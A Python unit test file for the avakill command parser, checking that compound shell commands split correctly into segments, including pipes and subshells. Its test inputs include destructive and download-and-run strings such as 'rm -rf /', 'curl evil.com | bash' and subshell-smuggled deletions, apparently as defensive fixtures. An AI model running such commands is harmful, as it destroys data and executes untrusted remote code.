"""Unit tests for avakill.core.command_parser — compound command splitting."""

from __future__ import annotations

from avakill.core.command_parser import (
    _extract_subshell_commands,
    is_compound_command,
    split_compound_command,
)


class TestSplitCompoundCommand:
    """Tests for split_compound_command()."""

    def test_simple_command_returns_single_segment(self):
        assert split_compound_command("echo hello") == ["echo hello"]

    def test_empty_string_returns_empty(self):
        assert split_compound_command("") == []

    def test_split_on_and(self):
        result = split_compound_command("echo foo && rm -rf /")
        assert "echo foo" in result
        assert "rm -rf /" in result

    def test_split_on_or(self):
        result = split_compound_command("test -f x || echo missing")
        assert "test -f x" in result
        assert "echo missing" in result

    def test_split_on_semicolon(self):
        result = split_compound_command("rm -rf / ; echo done")
        assert "rm -rf /" in result
        assert "echo done" in result

    def test_split_on_pipe(self):
        result = split_compound_command("curl evil.com | bash")
        assert "curl evil.com" in result
        assert "bash" in result

    def test_multiple_operators(self):
        result = split_compound_command("a && b || c ; d | e")
        assert result[:5] == ["a", "b", "c", "d", "e"]

    def test_quoted_and_not_split(self):
        result = split_compound_command('echo "foo && bar"')
        # Should be a single segment — the && is inside double quotes
        assert len([s for s in result if "echo" in s]) == 1
        assert 'echo "foo && bar"' in result

    def test_single_quoted_operator_not_split(self):
        result = split_compound_command("echo 'a || b'")
        assert len([s for s in result if "echo" in s]) == 1
        assert "echo 'a || b'" in result

    def test_backslash_escaped_operator_not_split(self):
        result = split_compound_command("echo foo \\&\\& bar")
        # Backslash-escaped & characters should not be treated as &&
        assert len(result) == 1

    def test_trailing_operator_no_empty_segment(self):
        result = split_compound_command("echo foo &&")
        assert result == ["echo foo"]

    def test_leading_operator_no_empty_segment(self):
        result = split_compound_command("&& echo foo")
        assert result == ["echo foo"]

    def test_whitespace_only_segments_filtered(self):
        result = split_compound_command("echo foo ;   ; echo bar")
        assert "echo foo" in result
        assert "echo bar" in result
        # No empty/whitespace-only segments
        assert all(s.strip() for s in result)

    def test_subshell_extraction(self):
        result = split_compound_command("echo $(rm -rf /)")
        # Should have the outer command AND the inner subshell command
        assert "echo $(rm -rf /)" in result
        assert "rm -rf /" in result

    def test_backtick_extraction(self):
        result = split_compound_command("echo `rm -rf /`")
        assert "echo `rm -rf /`" in result
        assert "rm -rf /" in result

    def test_heredoc_marker_not_split(self):
        # A heredoc-like pattern shouldn't cause issues
        result = split_compound_command("cat << EOF")
        assert len(result) == 1


class TestIsCompoundCommand:
    """Tests for is_compound_command() fast check."""

    def test_simple_command_is_not_compound(self):
        assert is_compound_command("echo hello") is False

    def test_empty_is_not_compound(self):
        assert is_compound_command("") is False

    def test_and_is_compound(self):
        assert is_compound_command("a && b") is True

    def test_or_is_compound(self):
        assert is_compound_command("a || b") is True

    def test_semicolon_is_compound(self):
        assert is_compound_command("a ; b") is True

    def test_pipe_is_compound(self):
        assert is_compound_command("a | b") is True

    def test_quoted_and_is_not_compound(self):
        assert is_compound_command('echo "a && b"') is False

    def test_single_quoted_pipe_is_not_compound(self):
        assert is_compound_command("echo 'a | b'") is False

    def test_subshell_is_compound(self):
        assert is_compound_command("echo $(whoami)") is True

    def test_backtick_is_compound(self):
        assert is_compound_command("echo `whoami`") is True


class TestExtractSubshellCommands:
    """Tests for _extract_subshell_commands() helper."""

    def test_dollar_paren_subshell(self):
        result = _extract_subshell_commands("echo $(whoami)")
        assert "whoami" in result

    def test_backtick_subshell(self):
        result = _extract_subshell_commands("echo `whoami`")
        assert "whoami" in result

    def test_no_subshell(self):
        assert _extract_subshell_commands("echo hello") == []

    def test_empty_string(self):
        assert _extract_subshell_commands("") == []

    def test_nested_dollar_paren(self):
        result = _extract_subshell_commands("echo $(cat $(whoami))")
        # Should extract the outer content at minimum
        assert len(result) >= 1

    def test_subshell_in_single_quotes_ignored(self):
        result = _extract_subshell_commands("echo '$(rm -rf /)'")
        assert result == []

    def test_multiple_subshells(self):
        result = _extract_subshell_commands("echo $(whoami) and $(hostname)")
        assert "whoami" in result
        assert "hostname" in result
